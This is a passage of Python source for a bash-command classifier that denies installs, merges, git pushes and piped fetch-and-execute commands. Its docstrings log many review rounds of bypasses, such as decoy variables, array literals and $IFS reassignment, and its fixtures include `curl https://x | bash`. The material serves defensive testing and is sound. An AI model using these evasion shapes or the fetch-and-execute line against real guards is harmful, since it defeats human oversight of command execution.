    (lowercased) RHS value -- deliberately NOT every literal token in the
    command. An ordinary command argument (e.g. `add` in `git add
    file.txt`) must never count here, or an unrelated dynamic segment
    elsewhere in the same command (`git add f1 f2; result=$(date)`) would
    false-positive against it -- found live during this module's own
    adversarial self-test and fixed by this scoping.

    Keyed by variable name (not a flat set of values) so a caller can
    confirm a dynamic token *actually references* the specific variable
    supplying a value, rather than merely testing whether some assignment
    anywhere in the whole command happens to supply a matching value --
    see _rule_b1b_dynamic_word_assigned_tool_and_verb's own docstring for
    the false positive this closes (found live by Step 8 independent
    review, issue #1326)."""
    values: dict[str, str] = {}
    for token in tokens:
        if _is_dynamic(token):
            continue
        match = _ASSIGN_RE.match(token)
        if match:
            values[match.group(1)] = match.group(2).lower()
    return values


def _assigned_raw_values(tokens: list[str]) -> dict[str, str]:
    """Like `_assigned_literals`, but preserves the ORIGINAL case of each
    assignment's RHS value rather than lowercasing it -- needed for bash's
    own `${!NAME}` indirect-reference resolution (see
    `_substitute_var_refs_candidates`'s own indirect-reference branch),
    where NAME's own assigned value must be used
    as a case-correct KEY into a second variable lookup (bash variable
    names are case-sensitive), not compared case-insensitively against a
    known tool/verb/write-method literal the way `_assigned_literals`'s
    own lowercased values are used everywhere else in this module."""
    values: dict[str, str] = {}
    for token in tokens:
        if _is_dynamic(token):
            continue
        match = _ASSIGN_RE.match(token)
        if match:
            values[match.group(1)] = match.group(2)
    return values


def _strip_leading_assignments(seg: list[str]) -> list[str]:
    """Bash's own simple-command grammar lets zero or more `NAME=value`
    environment-assignment tokens precede the actual command word (`X=foo
    uv install foo` runs `uv install foo` with `X=foo` set only in that
    one invocation's environment -- ordinary, widely-used syntax, not a
    technique). `_rule_b1a_dynamic_word_same_segment_verb`/`_rule_b1b_
    dynamic_word_assigned_tool_and_verb` (both gated on `_is_dynamic(
    seg[0])` as their own first check) and `_rule_b2_watched_tool_
    dynamic_verb_position` (requires a literal watched tool at `seg[0]`)
    implicitly assumed `seg[0]` always IS that word -- applying this
    strip ONCE, uniformly, to every segment before any rule runs (see
    `_classify_tokens`) makes that assumption correct everywhere at once.

    A DYNAMIC assignment (`X=$(evil) uv $x foo`) is skipped too -- the
    assignment SHAPE (`NAME=...`), not whether the value is static or
    dynamic, is what makes bash treat it as an environment prefix rather
    than the command word; `_ASSIGN_RE`'s own `(.*)$` capture already
    matches a `$`-containing RHS just as readily as a literal one.

    Found live by Step 8 independent review, fifteenth round (issue
    #1326), ported from the task-scoped sibling module's own fifteenth-
    round fix of the same finding: `X=foo $T install foo` (T=uv) and
    `X=foo uv $x foo` (x=install) both fully bypassed B1a/B1b's own
    indirection detection (confirmed live via a real bash proxy with a
    stand-in `uv` binary on PATH, capturing its own argv and environment)
    with NO indirection technique needed for the ASSIGNMENT prefix itself
    -- see the sibling module's own docstring for the fuller root-cause
    analysis and live-verification detail, which applies identically
    here.

    Rules that instead scan a WHOLE segment for a literal match
    regardless of position (`_rule_a_literal`'s adjacency scan, `_rule_
    gh_api_write`'s own sliding-window `gh`+`api` scan, `_is_git_push_
    segment`'s own literal-`git`-anywhere scan) were never affected by
    this gap -- confirmed live that `X=foo pip install foo`, `X=foo gh
    api repos/o/r/pulls/1/merge -XPOST`, and `X=foo git push origin
    main` were ALREADY correctly denied before this fix, which is why
    this strip is applied via `segments` (feeding every rule uniformly)
    rather than requiring those already-correct rules to change.

    A folded array-literal token (see `_fold_array_literal_spans`) also
    reaches this function `NAME=`-prefixed and gets stripped the same
    way -- despite an array literal's own elements NOT actually being
    inert (they become real argv once `"${NAME[@]}"` expands them later
    in the same command). That is safe here specifically because
    `_rule_array_literal_content` (see its own docstring) independently,
    recursively classifies every array literal's own inner content
    BEFORE this function ever runs, so this function discarding the
    (already-checked) folded token costs no coverage -- content-safety
    and this function's own "make `seg[0]` mean the real command word"
    job are fully decoupled (Step 8 independent review, eighteenth
    round, issue #1326)."""
    i = 0
    n = len(seg)
    while i < n and _ASSIGN_RE.match(seg[i]):
        i += 1
    return seg[i:]


def _array_literal_token_span(tokens: list[str], i: int) -> int | None:
    """If `tokens[i]` is a bare `NAME=` (EMPTY-value) assignment token
    immediately followed by `tokens[i + 1] == "("` -- bash's own array-
    literal syntax (`NAME=(elem1 elem2)`, also `declare -a NAME=(...)`)
    -- return the index one past the matching `)`, tracking paren-nesting
    depth the same way `_command_substitution_token_span` does. Returns
    `None` otherwise, including for an ordinary `NAME=value` assignment
    (non-empty value) immediately followed by `(` -- that shape is not
    valid array-literal syntax in real bash, and this function makes no
    claim about what it means.

    Shared by `_fold_array_literal_spans` below."""
    match = _ASSIGN_RE.match(tokens[i])
    if not (match and match.group(2) == "" and i + 1 < len(tokens) and tokens[i + 1] == "("):
        return None
    depth = 1
    j = i + 2
    n = len(tokens)
    while j < n and depth > 0:
        if tokens[j] == "(":
            depth += 1
        elif tokens[j] == ")":
            depth -= 1
        j += 1
    return j


def _fold_array_literal_spans(tokens: list[str]) -> list[str]:
    """Fold each `NAME=(...)` array-literal span (found via `_array_
    literal_token_span`) into a single token -- the same "make the span's
    boundary visible as one atomic unit before segmenting" strategy
    `_fold_command_substitution_spans` already uses for `$(...)`, applied
    here for the identical underlying reason: `NAME=(elem1 elem2)` is
    indistinguishable, from the token stream alone, from an empty
    assignment immediately followed by an UNRELATED subshell (`NAME=;
    (cmd)`) -- shlex breaks a word at `(` regardless of whether real bash
    source had a space there, discarding the one detail (adjacency)
    bash's own grammar actually depends on. Left un-folded, `segment_
    tokens` would put the array's own element list in its own segment,
    separate from the `NAME=` token that actually explains it -- and if
    that segment's own FIRST token happens to be an unresolvable dynamic
    one, indistinguishable, to every `seg[0]`-anchored fail-closed rule,
    from an attempted command invocation with an obfuscated command word
    (confirmed live: `declare -a arr=($(seq 1 5))` was wrongly denied
    before this fold existed at all, Step 8 independent review, fifteenth
    round, issue #1326).

    Folds EVERY array-literal span unconditionally -- dynamic or fully
    literal content alike -- deliberately simpler than three earlier,
    narrower designs this function went through and then abandoned (see
    Design history below): this fold's own downstream effect on
    `_strip_leading_assignments` (making the array's own elements
    invisible to every `seg[0]`-anchored or whole-segment rule once
    discarded as an "inert" assignment) is now SAFE regardless of what
    the array's own content is, because `_rule_array_literal_content`
    (see its own docstring) independently, recursively classifies every
    array literal's own inner content BEFORE this fold ever runs --
    content-safety and false-positive-avoidance are now two fully
    decoupled concerns, the same separation `_fold_command_substitution_
    spans`/`_rule_command_substitution_content` already established for
    `$(...)` spans. This function's only remaining job is protecting
    `seg[0]`-anchored rules from an unresolvable-dynamic false positive;
    it no longer has ANY responsibility for content-safety at all.

    Design history (Step 8 independent review, issue #1326): sixteenth
    round folded unconditionally too, but `_strip_leading_assignments`
    alone discarded a folded LITERAL span's own content with no
    recursive check to catch it first -- `declare -a A=(pip install
    foo); "${A[@]}"` was wrongly ALLOWED. Fixed (that round) by leaving
    a fully-literal span unfolded. Seventeenth round found that "any
    element dynamic" folded a MIXED span too eagerly, still hiding a
    literal denied verb sitting next to one unrelated dynamic element --
    narrowed to "fold only if the FIRST element is dynamic." Eighteenth
    round found that narrower condition STILL wrongly allowed `A=(
    $NEVERSET uv install); "${A[@]}" foo` (confirmed live, real bash:
    an UNQUOTED reference to a variable never assigned anywhere in the
    command word-splits away to NOTHING at real bash runtime, so `uv`
    genuinely becomes the array's own REAL first element once expanded,
    with `install` right after it -- `A=($NEVERSET gh pr merge 1)`
    verified via `declare -p` to produce a 4-element array `(gh pr merge
    1)`, `NEVERSET` contributing nothing at all) -- folding on "first
    element dynamic" hid this exactly the same way sixteenth round's
    unconditional fold did, since the fold's own boundary detection has
    no way to know a dynamic-looking first element might not even
    survive to runtime. Rather than continue narrowing the fold
    condition against an open-ended set of shapes that can defeat any
    purely fold-side heuristic, eighteenth round added the independent
    recursive content check instead and reverted this function to its
    simplest form -- unconditional folding -- since the content check
    makes the fold's own behavior irrelevant to safety.

    The array's own inner elements are joined WITH spaces, the opener
    (`NAME=` plus `(`) and closer (`)`) joined with NO separator --
    mirroring `_fold_command_substitution_spans`'s own established
    opener/inner/closer split, for the identical reason given there: a
    plain `"".join` of the whole span fuses adjacent words together."""
    folded: list[str] = []
    i = 0
    n = len(tokens)
    while i < n:
        end = _array_literal_token_span(tokens, i)
        if end is not None:
            prefix = tokens[i] + tokens[i + 1]
            inner = tokens[i + 2 : end - 1]
            suffix = tokens[end - 1]
            middle = (" " + " ".join(inner)) if inner else ""
            folded.append(prefix + middle + suffix)
            i = end
        else:
            folded.append(tokens[i])
            i += 1
    return folded


# One reference, either the plain form (`$NAME`/`${NAME}`) or a braced
# form with a SIMPLE (no further brackets -- no nested dynamic subscript)
# array-element subscript (`${NAME[0]}`, `${NAME[@]}`, `${NAME[$i]}`).
# Deliberately excludes a default-clause (`${NAME:-default}`) or indirect
# (`${!NAME}`) reference -- see `_token_is_all_unassigned_refs`'s own
# docstring for why those must NOT be treated as vanishing. NAMED groups
# (`bare`/`braced`), not positional -- `_REF_RUN_NAME_RE` below is this
# SAME pattern, unquantified, so its own two alternatives can never
# silently drift out of sync with `_REF_RUN_TOKEN_RE`'s (a future round
# extending one and forgetting the other, found live by Step 8
# independent review, twenty-first round, issue #1326) -- there is only
# ever one definition to extend. Named `_SRC`, not `_RE` (found live by
# the same round's own independent review): this is regex SOURCE TEXT, a
# plain `str` interpolated into `_REF_RUN_TOKEN_RE` below, never itself
# compiled or called -- every OTHER `_RE`-suffixed name in this module
# (`_ASSIGN_RE`, `_VAR_REF_FULL_RE`, `_REF_RUN_TOKEN_RE`/`_REF_RUN_NAME_RE`
# themselves) is an already-compiled `re.Pattern`, callable via `.match()`/
# `.search()`/`.finditer()` directly; naming this the same way would wrongly
# suggest it is too.
_ONE_REF_SRC = r"\$(?P<bare>[A-Za-z_][A-Za-z0-9_]*)|\$\{(?P<braced>[A-Za-z_][A-Za-z0-9_]*)(?:\[[^][]*\])?\}"
# The whole token must be nothing BUT one or more back-to-back references
# of the shape above -- no other character anywhere in the token. A named
# group repeated under a quantifier is valid Python `re` syntax (the name
# is defined once, syntactically, regardless of how many times `+`
# repeats it at match time) -- confirmed live that this matches/finditers
# identically to the pre-unification two-regex form across every shape
# `_token_is_all_unassigned_refs`'s own tests exercise.
_REF_RUN_TOKEN_RE = re.compile(rf"^(?:{_ONE_REF_SRC})+$")
# The individual references within such a token, captured for the
# unassigned-name check -- group("bare") for the bare form, group(
# "braced") for the braced (optionally subscripted) form.
_REF_RUN_NAME_RE = re.compile(_ONE_REF_SRC)
# Bash's own DEFAULT $IFS characters -- used by `_token_is_all_unassigned_
# refs` to decide whether an assigned-but-all-whitespace value word-splits
# away to nothing the same way an assigned-empty one does. Deliberately
# NARROWER than Python's own `str.strip()` default whitespace set (which
# also strips `\r`/`\f`/`\v`/`\x1c`-`\x1f` and more) -- found live by Step
# 8 independent review, twenty-sixth round (issue #1326): confirmed live
# via real bash (`set -x`) that `CFG=$'\r'; git -v $CFG push origin main`
# does NOT word-split `$CFG` away (`\r` alone survives as its own argv
# element, `+ git -v $'\r' push origin main`), contradicting `_token_is_
# all_unassigned_refs`'s own docstring, which explicitly names "space/
# tab/newline" as the default IFS this check relies on -- a real
# docstring/implementation contract mismatch (safe-direction: it only
# ever caused OVER-detection at every traced call site, never a missed
# bypass, but a mismatch nonetheless).
_BASH_DEFAULT_IFS = " \t\n"


def _token_is_all_unassigned_refs(token: str, name_to_raw_value: dict[str, str]) -> bool:
    """TOKEN word-splits away to NOTHING, unquoted, at real bash runtime,
    because it is composed ENTIRELY of one or more back-to-back variable
    references -- bare (`$NAME`), braced (`${NAME}`), or braced with a
    SIMPLE array-element subscript (`${NAME[0]}`, `${NAME[@]}`). For the
    bare and plain-braced (no subscript) forms, this covers a NAME
    never assigned anywhere in this command AND a NAME assigned a value
    that is itself empty or ALL of bash's own (not Python's broader)
    IFS whitespace (see the twenty-fourth/twenty-fifth/twenty-sixth-
    round paragraphs below for why); the subscripted form stays
    narrower (never-assigned only -- see that same discussion for why).
    Confirmed live via `declare -p` against real bash for both
    shapes this generalizes over: `A=($NEVERSET gh pr merge 1)` (a single
    bare reference) and `A=(${NEVERSET[0]} gh pr merge 1)` (a braced
    subscript reference) both produce the identical 4-element array `(gh
    pr merge 1)`, the reference contributing zero elements either way --
    and `A=($A_UNSET$B_UNSET gh pr merge 1)` (TWO fused bare references,
    each independently unset) produces the same 4-element array too, the
    whole fused token collapsing to nothing as a unit.

    Deliberately narrower than `_substitute_var_refs_candidates`'s own
    general candidate enumeration: a default-clause (`${NAME:-default}`)
    reference supplies REAL substitute text regardless of whether NAME is
    assigned, so it never vanishes to nothing the way a bare/braced/
    subscript reference does; an indirect (`${!NAME}`) reference resolves
    through a second lookup this classifier cannot rule out succeeding,
    so it is not SOUND to treat as vanishing either -- neither shape is
    matched by `_ONE_REF_SRC`, so neither is ever treated as a vanishing
    element here.

    Found live by Step 8 independent review, twentieth round (issue
    #1326): the nineteenth round's own `_BARE_VAR_REF_RE` matched only a
    SINGLE bare-or-braced reference occupying the WHOLE token, missing
    two other shapes that word-split away to nothing the identical way --
    a braced array-element subscript to an unassigned NAME (`${NEVERSET
    [0]}`), and two-or-more bare/braced references FUSED into one token
    with nothing else between them (`$A$B`, both unassigned). Either
    shape defeated the eighteenth/nineteenth-round collapse entirely,
    hiding fully literal denied-tool content sitting right after the
    decoy from every `seg[0]`-anchored rule (the task file's `_rule_gh_
    any`/`_rule_bare_install` in particular, both purely position-
    anchored with no literal-adjacency fallback the way `_rule_a_literal`
    has). Replaces the prior single-reference-shaped `_BARE_VAR_REF_RE`
    with this general "whole token is a run of one or more vanishing
    references" check, closing both shapes (and any further fusion of
    the same two reference forms) with one mechanism instead of chasing
    each new decoy shape with a narrower regex extension.

    ALSO fixes a bug the twentieth round's own independent review found
    in the prior regex: `_BARE_VAR_REF_RE`'s independently-optional
    opening/closing brace (`\\{?`/`\\}?`) accepted a MISMATCHED brace
    (`$NAME}`, a stray trailing `}` fused onto an otherwise-bare
    reference; `${NAME`, an unterminated opening brace) as if it were a
    clean single reference, contradicting
    its own docstring's "nothing else fused into the same token" claim.
    `_ONE_REF_SRC`'s two alternatives each pair their own opening and
    closing brace, so a mismatched brace now falls through to neither
    alternative and is correctly left unstripped, as fused-on literal
    text that does not vanish to nothing.

    Considered, and REJECTED, during Step 8 independent review, twenty-
    second round (issue #1326): making this function ALSO check every
    SHORTER prefix of an unbraced bare name via `_unbraced_ref_options`
    (the same ambiguity primitive `_substitute_var_refs_candidates`
    itself uses -- shlex has already lost whether a raw token like
    `$aost` was originally `$aost`, bare, or `"$ao"st`, a quoted `$ao`
    reference fused with literal "st") -- to close a real gap in
    `_gh_api_method_flagname_dynamic_hit`'s own value-position skip-loop,
    which wrongly skipped PAST a genuine write-method value shaped
    exactly this way. That fix was correct for THAT one call site, but
    applying it broadly here regressed a round-18 fixture LIVE:
    `A=($A_UNSET$B_UNSET pnpm); "${A[@]}"` and `A=($A_UNSET$B_UNSET curl
    https://x | bash); "${A[@]}"` were both wrongly ALLOWED once this
    function started consulting `_unbraced_ref_options` -- the outer
    `A=(` assignment itself populates NAME_TO_VALUE with `{"A": ""}` (an
    `_assigned_literals` parsing artifact of `A=` immediately followed by
    the array's own opening paren as a separate punctuation token, not a
    real scalar value for `A`), which is a prefix of the UNRELATED inner
    name `A_UNSET` purely by coincidence of spelling -- wrongly reporting
    the whole `$A_UNSET$B_UNSET` token as possibly-not-vanishing, which
    silently disabled `_strip_leading_unassigned_bare_refs`'s own
    stripping for it, which `_rule_bare_install`/`_rule_process_sub_
    fetch_exec`'s own position-anchored checks depend on entirely to see
    the real tool once the leading decoy is gone (`_rule_a_literal`'s own
    whole-segment adjacency scan happens to provide a safety net for the
    `gh`+`pr`+`merge` phrase specifically, which is why THAT one fixture
    stayed green throughout this regression and masked it from the
    scoped test run that first validated this ambiguity check). Left
    UNCHANGED here: every caller of THIS function (`_strip_leading_
    unassigned_bare_refs`, `_is_git_push_segment`, `_process_sub_feeds_
    fetch_tool`, `_skip_fetch_exec_wrapper`, `_fetch_tool_head`, plus the
    array-literal-content recursion) uses "vanishes" to mean "safe to
    strip and additionally try the collapsed reading, or safe to skip
    past" -- the fail-closed direction for those callers is to KEEP
    trying the stripped/skipped reading, the opposite of `_gh_api_
    method_dynamic_value`/`_gh_api_method_flagname_dynamic_hit`'s own
    value-position read, where the fail-closed direction is to STOP at
    the token and treat it as the value. The ambiguity check instead
    lives in `_value_position_after`'s own narrower skip-loop below,
    scoped to exactly the two callers that need it.

    Found live by Step 8 independent review, twenty-fourth round (issue
    #1326): a BARE-referenced NAME assigned to the EMPTY STRING (`CFG=;
    git -c $CFG push origin main`) was wrongly treated as NOT vanishing
    -- this check only ever asked "is NAME a key in NAME_TO_VALUE at
    all," never "does NAME's own assigned value actually survive word-
    splitting." Confirmed live via real bash (`set -x`) that an
    unquoted reference to a variable assigned the empty string
    word-splits away IDENTICALLY to a genuinely-unset one -- `CFG=; git
    -v $CFG push origin main` real-expands to `git -v push origin
    main`, the same as `git -v push origin main` directly. This was a
    live, exploitable gap in EVERY caller listed above, not merely the
    twenty-third round's own `-c` fix: found there first only because
    that round's new "consume any non-vanishing dynamic token" logic
    made the gap directly observable as a wrong verdict (a real,
    non-push command wrongly flagged as a push once `-c` swallowed the
    empty-then-vanished value's own SUCCESSOR token instead).

    Originally (twenty-fourth round) scoped to the BARE form only, not
    ANY braced reference at all -- `_ONE_REF_SRC`'s own "braced" group
    matches a plain `${NAME}` and a subscripted `${NAME[0]}` under the
    SAME capture (the subscript is optional within the group, so
    `match.group("braced")` alone cannot distinguish them), and
    `_assigned_literals` records EVERY array declaration's own NAME as
    mapped to the empty string regardless of the array's real element
    contents (an `A=(` token's own RHS, split from the array's opening
    paren by punctuation tokenization, is always literally empty).
    Applying the empty-value-counts-as-vanishing logic to EVERY braced
    reference was tried and REVERTED after it silently "fixed" (changed
    the behavior of) `_rule_array_literal_content`'s own disclosed,
    deliberately-left-open residual (see that function's own
    docstring): `NEVERSET=("" b c); A=(${NEVERSET[0]} gh pr merge 1)`
    happens to have a genuinely-empty first element, so the broader
    check accidentally "worked" there, but the SAME broader check would
    also wrongly treat `${NEVERSET[0]}` as vanishing when NEVERSET's
    real first element is NON-empty (`NEVERSET=(real b c)`) -- this
    module has no per-index array-element tracking to tell the two
    cases apart.

    Found live by Step 8 independent review, twenty-fifth round (issue
    #1326), refining the above: excluding EVERY braced reference over-
    corrected -- a plain, UN-subscripted `${NAME}` has no array-content
    ambiguity at all (it is exactly the braced spelling of the same
    bare scalar reference), so `CFG=; git -v ${CFG} push origin main`
    was STILL wrongly left undetected purely because of the `{}`
    spelling, confirmed live via real bash that this real-expands to
    `git -v push origin main` identically to the already-fixed bare
    form. Closed by checking `match.group(0)` (the FULL matched text,
    including any brackets) for a literal `[` to tell a subscripted
    reference from a plain braced one -- `_ONE_REF_SRC`'s own subscript
    span uses `[^][]*` (no nested brackets possible), so a `[` anywhere
    in the match unambiguously means a subscript was present. Only the
    genuinely subscripted form stays on the original, narrower
    membership-only check.

    ALSO found live the same round: this check's own empty-string test
    (`name_to_value.get(name, "")` truthiness) only ever catches a
    LITERALLY empty value -- a value consisting ENTIRELY of IFS
    whitespace (the default IFS is space/tab/newline) ALSO word-splits
    away to nothing at real bash runtime, confirmed live via real bash
    that `CFG=" "; git -v $CFG push origin main` real-expands to `git
    -v push origin main` identically to the empty-string case, yet
    `" ".strip()` is falsy while `" "` itself is truthy in Python, so
    the un-stripped check missed it. Closed by checking whitespace-
    truthiness instead of raw truthiness for both the bare and the
    now-also-covered plain-braced forms -- stripping only
    `_BASH_DEFAULT_IFS`'s own three characters, NOT Python's own
    broader `str.strip()` default (see that constant's own module-level
    comment for the twenty-sixth-round finding this narrower stripping
    closes).

    Found live by Step 8 independent review, twenty-seventh round
    (issue #1326), and INITIALLY (mis)judged safe-direction-only and
    merely disclosed rather than fixed: this check always assumed
    bash's own DEFAULT `$IFS` (`_BASH_DEFAULT_IFS`) -- it had no
    awareness that the COMMAND ITSELF can reassign `$IFS` before a
    decoy reference is used. Found live by Step 8 independent review,
    twenty-eighth round (issue #1326), that this is actually a live
    HARD-DENY-BYPASS-CAPABLE gap, not merely a safe-direction one:
    `IFS="<CR>"; CFG="<CR>"; git -v $CFG push origin main` (a literal
    carriage-return byte, DOUBLE-QUOTED so it survives shlex's own
    tokenization intact -- an UNQUOTED `\r` is absorbed as ordinary
    shell whitespace by `tokenize()` itself before this code ever runs,
    which is why the twenty-seventh round's own example command did
    not actually reach this check through the real `classify()`
    pipeline and wrongly read as safe) reaches `_is_git_push_segment`'s
    own flag-skip loop with `$CFG` wrongly judged NOT-vanishing (since
    `\r` is not in `_BASH_DEFAULT_IFS`) -- the loop then `break`s at
    the literal `-v` flag's own decoy instead of skipping past it, and
    genuinely MISSES the `push` sitting one position further, confirmed
    live end-to-end via `classify()` returning `is_git_push=False`
    where the identical-ARGV default-IFS control (`CFG=" "; ...`)
    correctly returns `True`.

    Closed here, NARROWLY, rather than by fully tracking `$IFS`'s
    dynamic value (a materially larger change -- threading a per-
    command character set through every vanishing check in this module
    instead of the one fixed `_BASH_DEFAULT_IFS`, left as a disclosed
    gap for a future round if ever needed): whenever the command itself
    assigns ANYTHING to `IFS` (`"IFS" in name_to_value`), this function
    can no longer trust `_BASH_DEFAULT_IFS` to be the actual word-
    splitting character set in effect, so it fails closed by treating
    EVERY bare/plain-braced reference as POSSIBLY vanishing regardless
    of its own value -- correct for every caller of this function
    (`_strip_leading_unassigned_bare_refs`, `_is_git_push_segment`,
    `_value_position_after`'s own skip-loop, and the array-literal-
    content recursion all use "vanishes" to mean "safe to skip past, or
    safe to try the collapsed reading too," so erring toward MORE
    tokens reading as vanishing when `$IFS` is unpredictable is the
    fail-closed direction for every one of them, not a mixed bag).

    Found live by Step 8 independent review, twenty-ninth round (issue
    #1326): the twenty-eighth round's own blanket rule above -- and its
    claim that it was "correct for every caller ... not a mixed bag" --
    was ITSELF wrong, confirmed live via two independent adversarial
    reviews finding three separate live regressions. First,
    `_value_position_after`'s own skip-loop (routed through the
    separate, stricter `_token_is_unambiguously_vanishing` below) wants
    to STOP at the value position, not skip past it -- treating an
    actual dynamic write-method value (`${M}`, M=POST) as "vanishing"
    merely because `$IFS` was reassigned SOMEWHERE ELSE in the command
    made the skip-loop jump past the real value and read an unrelated,
    harmless literal token in its place instead: `IFS=x; echo hi;
    M=POST; gh api repos/foo/bar/merge -X ${M} extra` real-expands
    (confirmed via real bash `set -x`) to `gh api repos/foo/bar/merge -X
    POST extra`, a genuine write, but wrongly returned `deny=False`.
    Second, and far more consequential: `_is_git_push_segment`'s own
    `-c`/`_GIT_LONG_VALUE_FLAGS` value-consumption block (a DIRECT
    caller of THIS function, not routed through the stricter one) uses
    "vanishing" to decide whether to SKIP PAST a token while hunting for
    the real config value -- treating a token that does NOT actually
    vanish as if it does makes that block skip past the REAL config
    value and consume the WRONG later token (often the literal `push`
    itself) as `-c`'s own value instead, hiding the genuine `push` from
    the scan entirely. Confirmed live end-to-end with a thoroughly
    ordinary pattern, no exotic byte tricks needed -- just an everyday
    CSV-style IFS reassignment paired with an everyday `git -c`
    invocation: `IFS=,; CFG=user.name=x; git -c $CFG push` real-expands
    (confirmed via real bash `set -x`) to `git -c user.name=x push`, a
    genuine push, but the twenty-eighth round's own blanket rule made
    `classify()` wrongly return `is_git_push=False`/`deny=False` -- a NEW
    hard-deny bypass strictly broader and easier to trigger than the one
    that round set out to close. Third, lower severity but real: the
    SAME blanket rule made `_strip_leading_unassigned_bare_refs` wrongly
    treat an ordinary, non-vanishing leading reference (a real wrapper
    path assigned to a variable) as a decoy to strip purely because
    `$IFS` was reassigned anywhere in the command: `IFS=x; REAL=foo;
    $REAL uv $VERB` (real bash: runs `foo uv`, never touching the
    watched `uv` tool in dynamic-verb position) was wrongly denied.

    All three traced to the same root defect: the twenty-eighth round's
    fix THREW AWAY information it already had. `_assigned_literals`
    already records `$IFS`'s own literal reassigned value in
    `name_to_value["IFS"]` whenever the reassignment itself is a plain
    literal (not itself dynamic) -- the blanket rule ignored that known
    value entirely and substituted a maximally-pessimistic "anything
    might vanish" assumption instead of just USING it. Closed here by
    consulting the actual reassigned value when present, falling back to
    `_BASH_DEFAULT_IFS` exactly as before when `$IFS` was never
    reassigned (or was reassigned only dynamically, so `_assigned_
    literals` never recorded it): `effective_ifs = name_to_value.get(
    "IFS", _BASH_DEFAULT_IFS)`, used everywhere this function previously
    stripped `_BASH_DEFAULT_IFS` specifically. Re-verified live against
    all three regressions above (now correctly resolved) AND against the
    original twenty-eighth-round target (`IFS="<CR>"; CFG="<CR>"; git -v
    $CFG push origin main` -- `effective_ifs` is now the actual `"\r"`
    reassignment, so `$CFG`'s own `"\r"` value still correctly strips
    away to nothing and the push is still detected) AND against the
    twenty-third/twenty-fourth-round decoy scenarios that motivated the
    `-c` block's own skip-loop in the first place (a NAME never assigned
    anywhere, or assigned the empty string, still vanishes regardless of
    `$IFS`, since `"".strip(anything)` is always falsy). This retracts
    the "not a mixed bag" claim above -- it was wrong -- without
    reopening any prior round's fix.

    Still disclosed, not fixed, as a narrower residual than the blanket
    rule it replaces: this reads `name_to_raw_value["IFS"]` from the
    SAME flat, order-and-scope-blind assignment map every other lookup
    in this function already uses (see `_assigned_raw_values`'s own
    docstring) -- a command that reassigns `$IFS` more than once, or
    that references a decoy BEFORE the `$IFS` reassignment that would
    apply to it in real execution order, still only ever sees ONE
    captured value regardless of position, the same pre-existing scoping
    limitation every other name-to-value lookup in this module already
    accepts, not a new gap this fix introduces.

    A second, related disclosed residual found live the same
    (twenty-eighth) round: the `-c`/`_GIT_LONG_VALUE_FLAGS`
    value-consumption block inside `_is_git_push_segment` below now
    correctly determines that a value like `\r` does NOT vanish (per
    this fixed check) and so consumes it as the flag's own value -- but
    that block never validates whether the consumed text is actually a
    WELL-FORMED git config value (`section.key=value`); real git
    rejects a malformed one before ever reaching a subcommand
    (confirmed live: `git -c $'\r' push origin main` fails with `error:
    key does not contain a section: ...`, exit 128, never reaching
    push) -- so this can now report a push that real git would never
    actually perform. This is a NEW instance of the SAME accepted
    trade-off the `-c` block's own twenty-third-round fix already makes
    deliberately (see that block's own docstring): assume a surviving,
    non-flag-shaped token occupies the value slot so a real push
    sitting past it is never missed, rather than parsing git's own
    config-key grammar to rule out malformed values -- fail closed (a
    spurious warn/deny) over fail open (a missed real push), consistent
    with this module's own established posture throughout. Re-examined
    by Step 8 independent review, twenty-eighth round (issue #1326),
    specifically hunting for an UNDER-detection direction here (the
    same direction the `$IFS` residual above turned out to have) --
    none found: real git always consumes exactly one following token as
    `-c`'s value regardless of that token's own well-formedness
    (confirmed live, including a flag-shaped decoy: `git -c -v push
    origin main` genuinely has `-c` swallow `-v` itself as a malformed
    config key, never reaching `push` either), so this block's own
    "assume consumed, keep scanning" logic can only ever find a `push`
    that real git's own argv construction also reaches -- confirmed
    still safe-direction-only, left as a disclosed residual rather than
    fixed.

    Found live by Step 8 independent review, thirtieth round (issue
    #1326): the twenty-ninth round's own `effective_ifs` fix computed it
    (and every per-name value it stripped against `effective_ifs`) from
    NAME_TO_VALUE -- the LOWERCASED map `_assigned_literals` builds for
    case-INSENSITIVE comparisons elsewhere in this module (matching a
    literal tool name or write-method keyword regardless of how a human
    typed it). Real bash's own `$IFS` word-splitting is case-SENSITIVE:
    reusing the lowercased map here silently case-folded BOTH sides of
    the vanishing check, so a token whose real (mixed-case) value does
    NOT actually overlap the real (differently-cased) `$IFS` could still
    read as "vanishes" once both were folded to the same case --
    confirmed live end-to-end via real bash (`set -x`) that `IFS=post;
    DECOY=POST; gh api repos/foo/bar/merge -X ${DECOY} extra`
    real-expands to `gh api repos/foo/bar/merge -X POST extra` (a
    genuine write -- `POST`'s own uppercase letters are untouched by a
    lowercase-only `$IFS`), yet `classify()` wrongly returned
    `deny=False`: `${DECOY}` read as "vanishes" only because `_assigned_
    literals` had already folded both `POST` and the reassigned `$IFS`
    to `"post"`, at which point `"post".strip("post")` is empty. A NEW
    hard-deny bypass this round's own fix introduced, not a pre-existing
    one -- `_BASH_DEFAULT_IFS` (space/tab/newline) has no letters, so
    case-folding was inert before this round made `effective_ifs`
    capable of holding arbitrary reassigned characters.

    Closed by using `_assigned_raw_values`'s own case-PRESERVING map for
    every lookup this function makes (both `effective_ifs` itself and
    each per-name value strip-checked against it) instead of the
    lowercased one -- this module already carries a case-preserving map
    for exactly this class of problem (built for `${!NAME}` indirect-
    reference resolution, see `_assigned_raw_values`'s own docstring),
    and it was already threaded through to every caller of this
    function by the time this round started, so wiring it one level
    deeper here needed no new plumbing. Re-verified live that the
    original bypass command above is now correctly denied, and that
    every prior round's own pinned scenario (the round 27/28 carriage-
    return decoy, the round 23/24 never-assigned/empty-string decoys,
    the round 29 `git -c`/gh-api/wrapper-stripping scenarios) still
    resolves identically under the case-preserving map, since none of
    them depend on case-folding at all."""
    if not _REF_RUN_TOKEN_RE.match(token):
        return False
    effective_ifs = name_to_raw_value.get("IFS", _BASH_DEFAULT_IFS)
    for match in _REF_RUN_NAME_RE.finditer(token):
        bare_name = match.group("bare")
        if bare_name is not None:
            if name_to_raw_value.get(bare_name, "").strip(effective_ifs):
                return False
        else:
            braced_name = match.group("braced")
            if "[" in match.group(0):
                if braced_name in name_to_raw_value:
                    return False
            elif name_to_raw_value.get(braced_name, "").strip(effective_ifs):
                return False
    return True


def _strip_leading_unassigned_bare_refs(tokens: list[str], name_to_raw_value: dict[str, str]) -> list[str]:
    """A leading run of tokens that each vanish to nothing at real bash
    runtime (per `_token_is_all_unassigned_refs`, see its own docstring)
    is stripped away -- used by `_rule_array_literal_content` to
    additionally check an array literal's own content AS IF such a
